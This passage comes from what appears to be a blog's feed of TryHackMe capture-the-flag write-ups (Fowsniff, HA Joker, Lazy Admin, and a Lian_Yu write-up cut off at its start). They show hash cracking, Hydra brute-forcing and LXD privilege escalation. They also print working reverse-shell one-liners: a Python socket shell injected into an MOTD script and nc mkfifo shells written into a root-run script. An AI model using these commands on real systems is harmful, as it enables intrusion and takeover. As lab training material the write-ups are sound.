on.\nFor now, let\u0026rsquo;s see the .txt files. We see, amazing XD\n1.4. Exploring POP3 Service ┌──(kali㉿kali)-[~] └─$ telnet 10.10.115.96 110 Trying 10.10.115.96... Connected to 10.10.115.96. Escape character is '^]'. +OK Welcome to the Fowsniff Corporate Mail Server! We use telnet and specify the port. We see that it is a corporate mail server. Note the website mentions breach of employee usernames and passwords, so maybe we can try to login here.\n1.5. Internet Exploration: Googling Doing some Googling, we find: The first tweet mentiones a link to a pastebin,\nFOWSNIFF CORP PASSWORD LEAK ''~`` ( o o ) +-----.oooO--(_)--Oooo.------+ | | | FOWSNIFF | | got | | PWN3D!!! | | | | .oooO | | ( ) Oooo. | +---------\\ (----( )-------+ \\_) ) / (_/ FowSniff Corp got pwn3d by B1gN1nj4! No one is safe from my 1337 skillz! mauer@fowsniff:{hidden} mustikka@fowsniff:{hidden} tegel@fowsniff:{hidden} baksteen@fowsniff:{hidden} seina@fowsniff:{hidden} stone@fowsniff:{hidden} mursten@fowsniff:{hidden} parede@fowsniff:{hidden} sciana@fowsniff:{hidden} Fowsniff Corporation Passwords LEAKED! FOWSNIFF CORP PASSWORD DUMP! Here are their email passwords dumped from their databases. They left their pop3 server WIDE OPEN, too! MD5 is insecure, so you shouldn't have trouble cracking them but I was too lazy haha =P l8r n00bz! B1gN1nj4 So we get some interesting information:\n POP3 open (as we already explored) The hashes are MD5 Since these are email passwords, we can login to POP3 :D  1.6. Hash Cracking: JtR I pasted the username password combinations in a data file on my machine, and used the tool: John the Ripper to crack the MD5 hashes.\n┌──(kali㉿kali)-[/tmp] └─$ john data --format=\u0026quot;Raw-MD5\u0026quot; --wordlist=/usr/share/wordlists/rockyou.txt Using default input encoding: UTF-8 Loaded 9 password hashes with no different salts (Raw-MD5 [MD5 256/256 AVX2 8x3]) Warning: no OpenMP support for this hash type, consider --fork=6 Press 'q' or Ctrl-C to abort, almost any other key for status {hidden} (seina@fowsniff) {hidden} (parede@fowsniff) {hidden} (tegel@fowsniff) {hidden} (baksteen@fowsniff) {hidden} (mauer@fowsniff) {hidden} (sciana@fowsniff) {hidden} (mursten@fowsniff) {hidden} (mustikka@fowsniff) 8g 0:00:00:03 DONE (2021-06-07 22:08) 2.631g/s 4718Kp/s 4718Kc/s 12066KC/s fuckyooh21..*7¡Vamos! Use the \u0026quot;--show --format=Raw-MD5\u0026quot; options to display all of the cracked passwords reliably Session completed 1.7. Exploiting POP3 Service Using some help from this website we get the commands. Feel free to explore more.\n┌──(kali㉿kali)-[/tmp] └─$ telnet 10.10.115.96 110 Trying 10.10.115.96... Connected to 10.10.115.96. Escape character is '^]'. +OK Welcome to the Fowsniff Corporate Mail Server! USER seina +OK PASS {hidden} +OK Logged in. STAT +OK 2 2902 RETR 1 +OK 1622 octets Return-Path: \u0026lt;stone@fowsniff\u0026gt; X-Original-To: seina@fowsniff Delivered-To: seina@fowsniff Received: by fowsniff (Postfix, from userid 1000) id 0FA3916A; Tue, 13 Mar 2018 14:51:07 -0400 (EDT) To: baksteen@fowsniff, mauer@fowsniff, mursten@fowsniff, mustikka@fowsniff, parede@fowsniff, sciana@fowsniff, seina@fowsniff, tegel@fowsniff Subject: URGENT! Security EVENT! Message-Id: \u0026lt;20180313185107.0FA3916A@fowsniff\u0026gt; Date: Tue, 13 Mar 2018 14:51:07 -0400 (EDT) From: stone@fowsniff (stone) Dear All, A few days ago, a malicious actor was able to gain entry to our internal email systems. The attacker was able to exploit incorrectly filtered escape characters within our SQL database to access our login credentials. Both the SQL and authentication system used legacy methods that had not been updated in some time. We have been instructed to perform a complete internal system overhaul. While the main systems are \u0026quot;in the shop,\u0026quot; we have moved to this isolated, temporary server that has minimal functionality. This server is capable of sending and receiving emails, but only locally. That means you can only send emails to other users, not to the world wide web. You can, however, access this system via the SSH protocol. The temporary password for SSH is \u0026quot;{hidden}\u0026quot; You MUST change this password as soon as possible, and you will do so under my guidance. I saw the leak the attacker posted online, and I must say that your passwords were not very secure. Come see me in my office at your earliest convenience and we'll set it up. Thanks, A.J Stone . RETR 2 +OK 1280 octets Return-Path: \u0026lt;baksteen@fowsniff\u0026gt; X-Original-To: seina@fowsniff Delivered-To: seina@fowsniff Received: by fowsniff (Postfix, from userid 1004) id 101CA1AC2; Tue, 13 Mar 2018 14:54:05 -0400 (EDT) To: seina@fowsniff Subject: You missed out! Message-Id: \u0026lt;20180313185405.101CA1AC2@fowsniff\u0026gt; Date: Tue, 13 Mar 2018 14:54:05 -0400 (EDT) From: baksteen@fowsniff Devin, You should have seen the brass lay into AJ today! We are going to be talking about this one for a looooong time hahaha. Who knew the regional manager had been in the navy? She was swearing like a sailor! I don't know what kind of pneumonia or something you brought back with you from your camping trip, but I think I'm coming down with it myself. How long have you been gone - a week? Next time you're going to get sick and miss the managerial blowout of the century, at least keep it to yourself! I'm going to head home early and eat some chicken soup. I think I just got an email from Stone, too, but it's probably just some \u0026quot;Let me explain the tone of my meeting with management\u0026quot; face-saving mail. I'll read it when I get back. Feel better, Skyler PS: Make sure you change your email password. AJ had been telling us to do that right before Captain Profanity showed up. . PS: if you have trouble logging out of this weird thing, read the help message on the top :D\n2. Foothold From the first email, we get: The temporary password for SSH is \u0026quot;{hidden}\u0026quot;\nWe can now login using SSH :)\nUsing the credentials we got - both the username and password,\n┌──(kali㉿kali)-[/tmp] └─$ ssh {hidden-username}@10.10.115.96 {hidden-username}@10.10.115.96's password: _____ _ __ __ :sdddddddddddddddy+ | ___|____ _____ _ __ (_)/ _|/ _| :yNMMMMMMMMMMMMMNmhsso | |_ / _ \\ \\ /\\ / / __| '_ \\| | |_| |_ .sdmmmmmNmmmmmmmNdyssssso | _| (_) \\ V V /\\__ \\ | | | | _| _| -: y. dssssssso |_| \\___/ \\_/\\_/ |___/_| |_|_|_| |_| -: y. dssssssso ____ -: y. dssssssso / ___|___ _ __ _ __ -: y. dssssssso | | / _ \\| '__| '_ \\ -: o. dssssssso | |__| (_) | | | |_) | _ -: o. yssssssso \\____\\___/|_| | .__/ (_) -: .+mdddddddmyyyyyhy: |_| -: -odMMMMMMMMMMmhhdy/. .ohdddddddddddddho: Delivering Solutions **** Welcome to the Fowsniff Corporate Server! **** ---------- NOTICE: ---------- * Due to the recent security breach, we are running on a very minimal system. * Contact AJ Stone -IMMEDIATELY- about changing your email and SSH passwords. Last login: Tue Mar 13 16:55:40 2018 from 192.168.7.36 {hidden-username}@fowsniff:~$ We are in!\n3. PrivEsc The room hints us to look at the files owned by the group. Using find / -type f -group users, we get a file on the top named:  /opt/cube/cube.sh\nExploring more, we get the following file.\n{hidden-username}@fowsniff:/etc/update-motd.d$ cat 00-header #!/bin/sh # # 00-header - create the header of the MOTD # Copyright (C) 2009-2010 Canonical Ltd. # {truncated} # #printf \u0026quot;Welcome to %s (%s %s %s)\\n\u0026quot; \u0026quot;$DISTRIB_DESCRIPTION\u0026quot; \u0026quot;$(uname -o)\u0026quot; \u0026quot;$(uname -r)\u0026quot; \u0026quot;$(uname -m)\u0026quot; sh /opt/cube/cube.sh This means that as soon as you connect to ssh, the update-motd.d file is run, and the banner, stored in /opt/cube/cube.sh is shown to you.\nSince we found this because we are in this group, we can edit this. This means we can now put in a reverse shell. From Reverse Shell Generator,\nexport RHOST=\u0026quot;{MY_IP}\u0026quot;;export RPORT=1337;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\u0026quot;RHOST\u0026quot;),int(os.getenv(\u0026quot;RPORT\u0026quot;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\u0026quot;sh\u0026quot;)'\nAnd \u0026hellip; System compromised!\n","date":"2021-06-15T00:00:00Z","image":"https://tryhackme-images.s3.amazonaws.com/room-icons/97b218eed9688e9a5cbe136714b86288.jpeg","permalink":"https://chaudhary1337.github.io/p/tryhackme-fowsniff-ctf-writeup/","title":"TryHackMe: Fowsniff CTF Writeup"},{"content":"Play\n1. Scanning \u0026amp; Enumeration We do the below scans in parallel.\n1.1. Port Scanning PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 ad:20:1f:f4:33:1b:00:70:b3:85:cb:87:00:c4:f4:f7 (RSA) | 256 1b:f9:a8:ec:fd:35:ec:fb:04:d5:ee:2a:a1:7a:4f:78 (ECDSA) |_ 256 dc:d7:dd:6e:f6:71:1f:8c:2c:2c:a1:34:6d:29:99:20 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) | http-methods: |_ Supported Methods: GET POST OPTIONS HEAD |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: HA: Joker 8080/tcp open http Apache httpd 2.4.29 | http-auth: | HTTP/1.1 401 Unauthorized\\x0D |_ Basic realm=Please enter the password. |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: 401 Unauthorized Service Info: Host: localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel Port 8080 looks out of place, and wants a password.\n1.2. Web Enumeration ┌──(kali㉿kali)-[~] └─$ gobuster dir -u 10.10.183.215 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x 'php,html,txt' /img (Status: 301) [Size: 312] [--\u0026gt; http://10.10.183.215/img/] /css (Status: 301) [Size: 312] [--\u0026gt; http://10.10.183.215/css/] /secret.txt (Status: 200) [Size: 320] /server-status (Status: 403) [Size: 278] Only one file that pops out to us.\n1.3. Web Exploration /secret.txt on port 80 suggest a possible user.\nPort 8080 gives us a login form, http-get. We can try brute-forcing it using Hydra.\n1.4. Password Bruteforcing: Hydra ┌──(kali㉿kali)-[~] └─$ hydra 10.10.183.215 -s 8080 -l {username} -P /usr/share/wordlists/rockyou.txt http-get Hydra v9.1 (c) 2020 by van Hauser/THC \u0026amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway). Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-06-03 03:13:22 [WARNING] You must supply the web page as an additional option or via -m, default path set to / [DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task [DATA] attacking http-get://10.10.183.215:8080/ [STATUS] 1174.00 tries/min, 1174 tries in 00:01h, 14343225 to do in 203:38h, 16 active [8080][http-get] host: 10.10.183.215 login: {username} password: {password} 1 of 1 target successfully completed, 1 valid password found Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-06-03 03:14:34 Now, we can login on the port 8080 using these credentials.\n1.5. Web Exploration (Again) I did not know Joker is a Joomla fan. We check the robots.txt file as usual, and we get the directory structure of Joomla.\nUser-agent: * Disallow: /administrator/ Disallow: /bin/ Disallow: /cache/ Disallow: /cli/ Disallow: /components/ Disallow: /includes/ Disallow: /installation/ Disallow: /language/ Disallow: /layouts/ Disallow: /libraries/ Disallow: /logs/ Disallow: /modules/ Disallow: /plugins/ Disallow: /tmp/ Let\u0026rsquo;s go to /administrator/. I explore how to get the password in the next sections. 1.6. Web Enumeration (Again) ┌──(kali㉿kali)-[~] └─$ gobuster dir -u http://10.10.183.215:8080/ -U {username} -P {password} -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x 'php,html,txt' -t 108 -q /templates (Status: 301) [Size: 325] [--\u0026gt; http://10.10.183.215:8080/templates/] /modules (Status: 301) [Size: 323] [--\u0026gt; http://10.10.183.215:8080/modules/] /bin (Status: 301) [Size: 319] [--\u0026gt; http://10.10.183.215:8080/bin/] /plugins (Status: 301) [Size: 323] [--\u0026gt; http://10.10.183.215:8080/plugins/] /README (Status: 200) [Size: 4494] /README.txt (Status: 200) [Size: 4494] /cache (Status: 301) [Size: 321] [--\u0026gt; http://10.10.183.215:8080/cache/] /components (Status: 301) [Size: 326] [--\u0026gt; http://10.10.183.215:8080/components/] /robots (Status: 200) [Size: 836] /robots.txt (Status: 200) [Size: 836] /LICENSE.txt (Status: 200) [Size: 18092] /LICENSE (Status: 200) [Size: 18092] /administrator (Status: 301) [Size: 329] [--\u0026gt; http://10.10.183.215:8080/administrator/] /configuration.php (Status: 200) [Size: 0] Nothing that we don\u0026rsquo;t know. How about nikto to find more interesting things?\n┌──(kali㉿kali)-[~] └─$ nikto -h http://10.10.173.69:8080/ -id {username}:{password} - Nikto v2.1.6 --------------------------------------------------------------------------- + Target IP: 10.10.173.69 + Target Hostname: 10.10.173.69 + Target Port: 8080 + Start Time: 2021-06-03 03:49:05 (GMT-4) --------------------------------------------------------------------------- + Server: Apache/2.4.29 (Ubuntu) + The anti-clickjacking X-Frame-Options header is not present. + The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS + The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type + / - Requires Authentication for realm ' Please enter the password.' + Successfully authenticated to realm ' Please enter the password.' with user-supplied credentials. + Entry '/administrator/' in robots.txt returned a non-forbidden or redirect HTTP code (200) + Entry '/bin/' in robots.txt returned a non-forbidden or redirect HTTP code (200) + Entry '/cache/' in robots.txt returned a non-forbidden or redirect HTTP code (200) + Entry '/cli/' in robots.txt returned a non-forbidden or redirect HTTP code (200) + Entry '/components/' in robots.txt returned a non-forbidden or redirect HTTP code (200) + Entry '/includes/' in robots.txt returned a non-forbidden or redirect HTTP code (200) + Entry '/language/' in robots.txt returned a non-forbidden or redirect HTTP code (200) + Entry '/layouts/' in robots.txt returned a non-forbidden or redirect HTTP code (200) + Entry '/libraries/' in robots.txt returned a non-forbidden or redirect HTTP code (200) + Entry '/modules/' in robots.txt returned a non-forbidden or redirect HTTP code (200) + Entry '/plugins/' in robots.txt returned a non-forbidden or redirect HTTP code (200) + Entry '/tmp/' in robots.txt returned a non-forbidden or redirect HTTP code (200) + \u0026quot;robots.txt\u0026quot; contains 14 entries which should be manually viewed. + Apache/2.4.29 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch. + /backup.zip: Potentially interesting archive/cert file found. + /backup.zip: Potentially interesting archive/cert file found. (NOTE: requested by IP address). + Web Server returns a valid response with junk HTTP methods, this may cause false positives. + DEBUG HTTP verb may show server debugging information. See http://msdn.microsoft.com/en-us/library/e8z01xdh%28VS.80%29.aspx for details. + Uncommon header 'tcn' found, with contents: choice + OSVDB-3092: /web.config: ASP config file is accessible. Ooh! backup.zip looks interesting. Let\u0026rsquo;s explore it deeper.\n1.7. Zip Cracking ┌──(kali㉿kali)-[/tmp] └─$ unzip backup.zip Archive: backup.zip [backup.zip] db/cmsdb.sql password: Nothing is obvious as to what could be the password. I\u0026rsquo;ll use john.\nWait how?\n Using zip2john, we can get the hash: zip2john backup.zip \u0026gt; hash  Then, do john hash and there you go!  1.8. Logging In Recall we saw db/cmsdb.sql file above. In it, I found:\nLOCK TABLES `cc1gr_users` WRITE; /*!40000 ALTER TABLE `cc1gr_users` DISABLE KEYS */; INSERT INTO `cc1gr_users` VALUES (547,'Super Duper User','admin','admin@example.com',{hash was here, but it passed away :( },0,1,'2019-10-08 12:00:15','2019-10-25 15:20:02','0','{\\\u0026quot;admin_style\\\u0026quot;:\\\u0026quot;\\\u0026quot;,\\\u0026quot;admin_language\\\u0026quot;:\\\u0026quot;\\\u0026quot;,\\\u0026quot;language\\\u0026quot;:\\\u0026quot;\\\u0026quot;,\\\u0026quot;editor\\\u0026quot;:\\\u0026quot;\\\u0026quot;,\\\u0026quot;helpsite\\\u0026quot;:\\\u0026quot;\\\u0026quot;,\\\u0026quot;timezone\\\u0026quot;:\\\u0026quot;\\\u0026quot;}','0000-00-00 00:00:00',0,'','',0); /*!40000 ALTER TABLE `cc1gr_users` ENABLE KEYS */; UNLOCK TABLES; Again, we use john to crack.\n2. Foothold error.php Didnt work as it does in WordPress. So, I put the reverse shell in index.php.\nI used Reverse Shell Generator to get the PHP reverse shell.\n┌──(kali㉿kali)-[~/Desktop/tools/files] └─$ nc -lnvp 443 listening on [any] 443 ... connect to [10.17.8.184] from (UNKNOWN) [10.10.173.69] 51608 Linux ubuntu 4.15.0-55-generic #60-Ubuntu SMP Tue Jul 2 18:22:20 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux 01:02:25 up 16 min, 0 users, load average: 0.00, 0.09, 0.22 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT uid=33(www-data) gid=33(www-data) groups=33(www-data),115(lxd) sh: 0: can't access tty; job control turned off $ whoami www-data We are in!\n3. PrivEsc This article is very interesting and detailed, listing each and every stage of the epxloit.\nAfter getting the alpine file in the system using python http server, we do the following. (If you are stuck in the python3 server setup, feel free to lookup other of my writeups.)\nwww-data@ubuntu:/tmp$ lxc image import ./alpine-v3.13-x86_64-20210603_0407.tar.gz --alias myimage \u0026lt;-v3.13-x86_64-20210603_0407.tar.gz --alias myimage www-data@ubuntu:/tmp$ lxc image list lxc image list +---------+--------------+--------+-------------------------------+--------+--------+-----------------------------+ | ALIAS | FINGERPRINT | PUBLIC | DESCRIPTION | ARCH | SIZE | UPLOAD DATE | +---------+--------------+--------+-------------------------------+--------+--------+-----------------------------+ | myimage | 1e7c4197270d | no | alpine v3.13 (20210603_04:07) | x86_64 | 3.10MB | Jun 3, 2021 at 8:11am (UTC) | +---------+--------------+--------+-------------------------------+--------+--------+-----------------------------+ www-data@ubuntu:/tmp$ Continuing the exploit further,\n/mnt/root/root # ^[[31;18Rcat {file name}.{extension} cat final.txt ██╗ ██████╗ ██╗ ██╗███████╗██████╗ ██║██╔═══██╗██║ ██╔╝██╔════╝██╔══██╗ ██║██║ ██║█████╔╝ █████╗ ██████╔╝ ██ ██║██║ ██║██╔═██╗ ██╔══╝ ██╔══██╗ ╚█████╔╝╚██████╔╝██║ ██╗███████╗██║ ██║ ╚════╝ ╚═════╝ ╚═╝ ╚═╝╚══════╝╚═╝ ╚═╝ !! Congrats you have finished this task !! Contact us here: Hacking Articles : https://twitter.com/rajchandel/ Aarti Singh: https://in.linkedin.com/in/aarti-singh-353698114 +-+-+-+-+-+ +-+-+-+-+-+-+-+ |E|n|j|o|y| |H|A|C|K|I|N|G| +-+-+-+-+-+ +-+-+-+-+-+-+-+ 4. Room Specific Questions What version of Apache is it? Check the nmap scan results above in section 1.\nWhat port on this machine not need to be authenticated by user and password? 8080 asks for password, the other does not.\nThere is a file on this port that seems to be secret, what is it? Check the results of the web enumeration scan in section 1.\nWhen reading the secret file, We find with a conversation that seems contains at least two users and some keywords that can be intersting, what user do you think it is? The name of this room is based upon?\nWhat port on this machine need to be authenticated by Basic Authentication Mechanism? Nmap scan results show another port besides 80.\nAt this point we have one user and a url that needs to be aunthenticated, brute force it to get the password, what is that password? Crack the password using hydra!\nYeah!! We got the user and password and we see a cms based blog. Now check for directories and files in this port. What directory looks like as admin directory? Check the gobuster scan results.\nWe need access to the administration of the site in order to get a shell, there is a backup file, What is this file? Nikto scan results\nWe have the backup file and now we should look for some information, for example database, configuration files, etc \u0026hellip; But the backup file seems to be encrypted. What is the password? zip2john + john\nRemember that\u0026hellip; We need access to the administration of the site\u0026hellip; Blah blah blah. In our new discovery we see some files that have compromising information, maybe db? ok what if we do a restoration of the database! Some tables must have something like user_table! What is the super duper user? Check the SQL file dump\nSuper Duper User! What is the password? Check the SQL file dump + john (again)\nAt this point, you should be upload a reverse-shell in order to gain shell access. What is the owner of this session? Check the user in the code snippets pasted in Section 2. Foothold :)\nThis user belongs to a group that differs on your own group, What is this group? Check the id command once you are in the system.\nSpawn a tty shell. Easiest way is bash -i, but python3 shells work better for me. Use python3 -c 'import pty; pty. spawn(\u0026quot;/bin/bash\u0026quot;)' to get a TTY shell.\nIn this question you should be do a basic research on how linux containers (LXD) work, it has a small online tutorial. Googling \u0026ldquo;lxd try it online\u0026rdquo;. We use this link.\nResearch how to escalate privileges using LXD permissions and check to see if there are any images available on the box. The link above does the job.\nThe idea here is to mount the root of the OS file system on the container, this should give us access to the root directory. Create the container with the privilege true and mount the root file system on /mnt in order to gain access to /root directory on host machine. Check the steps done above in section 3. PrivEsc\nWhat is the name of the file in the /root directory? :)\n","date":"2021-06-15T00:00:00Z","image":"https://tryhackme-images.s3.amazonaws.com/room-icons/ed910d9d7c419b8266128e044a40c7e2.jpeg","permalink":"https://chaudhary1337.github.io/p/tryhackme-ha-joker-ctf-writeup/","title":"TryHackMe: HA Joker CTF Writeup"},{"content":"Play\n1. Enumeration + Exploration 1.1. Port Scanning ┌──(kali㉿kali)-[~] └─$ nmap -sC -sV -A 10.10.249.26 Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-24 02:40 EDT Nmap scan report for 10.10.249.26 Host is up (0.20s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA) | 256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA) |_ 256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 34.08 seconds Noting too out of the blue here. Let\u0026rsquo;s go to the gobsuter scans for Web Enumeration.\n1.2. Web Enumeration ┌──(kali㉿kali)-[~] └─$ gobuster dir -u 10.10.249.26 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -q /content (Status: 301) [Size: 314] [--\u0026gt; http://10.10.249.26/content/] Ah. Going to that page, we see the below.\nLet\u0026rsquo;s enumerate the /content/ directory in parallel.\n┌──(kali㉿kali)-[~] └─$ gobuster dir -u 10.10.249.26/content -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -q /images (Status: 301) [Size: 321] [--\u0026gt; http://10.10.249.26/content/images/] /js (Status: 301) [Size: 317] [--\u0026gt; http://10.10.249.26/content/js/] /inc (Status: 301) [Size: 318] [--\u0026gt; http://10.10.249.26/content/inc/] /as (Status: 301) [Size: 317] [--\u0026gt; http://10.10.249.26/content/as/] /_themes (Status: 301) [Size: 322] [--\u0026gt; http://10.10.249.26/content/_themes/] /attachment (Status: 301) [Size: 325] [--\u0026gt; http://10.10.249.26/content/attachment/] This gives us a lot to explore.\n1.3. Web Exploration We see the version of the sowftware being used.\nWe also see some backup files as below.\n┌──(kali㉿kali)-[/tmp] └─$ cat mysql_bakup_20191129023059-1.5.1.sql \u0026lt;?php return array ( 0 =\u0026gt; 'DROP TABLE IF EXISTS `%--%_attachment`;', 1 =\u0026gt; 'CREATE TABLE `%--%_attachment` ( {some more info} ) ENGINE=MyISAM AUTO_INCREMENT=4 DEFAULT CHARSET=utf8;', 14 =\u0026gt; 'INSERT INTO `%--%_options` VALUES( {...} \u0026quot;admin\\\\\u0026quot;;s:7:\\\\\u0026quot;manager\\\\\u0026quot;;s:6:\\\\\u0026quot;passwd\\\\\u0026quot;;s:32:\\\\\u0026quot;42f749ade7f9e195bf475f37a44c****\\\\ {some more information here} KEY `date` (`date`) ) ENGINE=MyISAM DEFAULT CHARSET=utf8;', );?\u0026gt; 1.4. Hash Cracking We get the hash, and we can now use an online tool like CrackStation\n42f749ade7f9e195bf475f37a44****: ***********\nAnd voila! We have the creds. The username is also mentioned closely ;)\nNow what?\n1.5. More Web Exploration There\u0026rsquo;s one link that we missed out on before.\nLet\u0026rsquo;s go to: /content/as/\nUsing the credentials as found before, we are in!\n1.6. Admin Page I also found more credentials lying around. These may become important later on.\nSince we have the version and the credentials in hand, I found one epxloit which looks pretty tasty.\nSweetRice 1.5.1 - Arbitrary File Upload\nNow, we attempt the foothold.\n2. Foothold We enter the initial creds found, which we used for logging in.\nAlso, use RevShells to get the PHP PentestMonkey shell.\nNOTE: .php did not work. It does not show in the uploads. Renaming it to .php5 worked.\nAlso, start up netcat on the selected port, and go to the url given.\n*in deep hacker voice* I am in!\n3. PrivEsc We so a bit of exploration and we get some more creds. These are the same as what we saw before.\nwww-data@THM-Chal:/home/itguy$ cat mysql_login.txt cat mysql_login.txt rice:********** Check sudo permissions.\nwww-data@THM-Chal:/$ sudo -l sudo -l Matching Defaults entries for www-data on THM-Chal: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User www-data may run the following commands on THM-Chal: (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl Okay backup scripts are usually interesting. Let\u0026rsquo;s see.\nwww-data@THM-Chal:/$ cat /home/itguy/backup.pl cat /home/itguy/backup.pl #!/usr/bin/perl system(\u0026quot;sh\u0026quot;, \u0026quot;/etc/copy.sh\u0026quot;); What about the permissions?\nwww-data@THM-Chal:/home/itguy$ ls -la | grep backup ls -la | grep backup -rw-r--r-x 1 root root 47 Nov 29 2019 backup.pl We can\u0026rsquo;t edit it. It runs another script named /etc/copy.sh. Let\u0026rsquo;s check that out.\nwww-data@THM-Chal:/home/itguy$ cat /etc/copy.sh cat /etc/copy.sh rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 192.168.0.190 5554 \u0026gt;/tmp/f OOF looks like a reverse shell. Can we edit it though?\nwww-data@THM-Chal:/home/itguy$ ls -la /etc/copy.sh ls -la /etc/copy.sh -rw-r--rwx 1 root root 81 Nov 29 2019 /etc/copy.sh Uh \u0026hellip; its owned by root.\nAll hope lost? Well, check the permissions XD\nUsing RevShells, we ge the command,\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2\u0026gt;\u0026amp;1|nc 10.17.8.184 1337 \u0026gt;/tmp/f\nI tried using nano, but it did not work. No vim either. So, we do echo :P\nwww-data@THM-Chal:/etc$ echo \u0026quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2\u0026gt;\u0026amp;1|nc 10.17.8.184 1234 \u0026gt;/tmp/f\u0026quot; \u0026gt; copy.sh\nExecute it as,\nwww-data@THM-Chal:/home/itguy$ sudo /usr/bin/perl /home/itguy/backup.pl\nWhile having a listener setup using netcat. Remember: It needs to be on another port - because we are already using one we connected to before.\nAnd \u0026hellip; we are done!\n","date":"2021-06-15T00:00:00Z","image":"https://i.imgur.com/3B6uSkg.jpg","permalink":"https://chaudhary1337.github.io/p/tryhackme-lazy-admin-writeup/","title":"TryHackMe: Lazy Admin Writeup"},{"content":"1. Port Scanning \u0026amp; Enumeration 1.1 Port Scanning ┌──(kali㉿kali)-[~] └─$ nmap -sC -sV -A 10.10.185.218 Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-19 04:00 EDT Nmap scan report for 10.10.185.218 Host is up (0.19s latency). Not shown: 996 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.2 22/tcp open ssh OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0) | ssh-hostkey: | 1024 56:50:bd:11:ef:d4:ac:56:32:c3:ee:73:3e:de:87:f4 (DSA) | 2048 39:6f:3a:9c:b6:2d:ad:0c:d8:6d:be:77:13:07:25:d6 (RSA) | 256 a6:69:96:d7:6d:61:27:96:7e:bb:9f:83:60:1b:52:12 (ECDSA) |_ 256 3f:43:76:75:a8:5a:a6:cd:33:b0:66:42:04:91:fe:a0 (ED25519) 80/tcp open http Apache httpd |_http-server-header: Apache |_http-title: Purgatory 111/tcp open rpcbind 2-4 (RPC #100000) | rpcinfo: | program version port/proto service | 100000 2,3,4 111/tcp rpcbind | 100000 2,3,4 111/udp rpcbind | 100000 3,4 111/tcp6 rpcbind | 100000 3,4 111/udp6 rpcbind | 100024 1 34042/udp status | 100024 1 40662/tcp status | 100024 1 41729/tcp6 status |_ 100024 1 46517/udp6 status Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 33.45 seconds No ftp anon login. That\u0026rsquo;s good. Nothing out of ordinary.\n1.2 Web Enumeration ┌──(kali㉿kali)-[~] └─$ gobuster dir -u 10.10.185.218 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -q /***a** (Status: 301) [Size: 236] [--\u0026gt; http://10.10.185.218/***a**/] Interesting. Looking at the source code, we get:\n\u0026lt;p\u0026gt;You should find a way to \u0026lt;b\u0026gt; Lian_Yu\u0026lt;/b\u0026gt; as we are planed. The Code Word is: \u0026lt;/p\u0026gt;\u0026lt;h2 style=\u0026quot;color:white\u0026quot;\u0026gt; *****a**e\u0026lt;/style\u0026gt;\u0026lt;/h2\u0026gt;\nIt also hints at \u0026lsquo;find a way\u0026rsquo;. This means more enumeration :D\n┌──(kali㉿kali)-[~] └─$ gobuster dir -u 10.10.185.218/***a** -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -q /21** (Status: 301) [Size: 241] [--\u0026gt; http://10.10.185.218/***a**/21**] Looking at the source code again, we get:\n\u0026lt;!-- you can avail your .ticket here but how? --\u0026gt;\nTime for another round of web enumeration!\n┌──(kali㉿kali)-[~] └─$ gobuster dir -u 10.10.185.218/***a**/21** -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x ticket -q /g****_*****.ticket (Status: 200) [Size: 71] Ey, viola!\nThis is just a token to get into Queen's Gambit(Ship) RTy8yh****** 1.3 Decoding Using CyberChef, I hoped to get some thing, but to no avail. It only says base64, but prints some garbage if we use it.\nHaving some previous blockchain experience, I remember that BTC usernames and something something uses 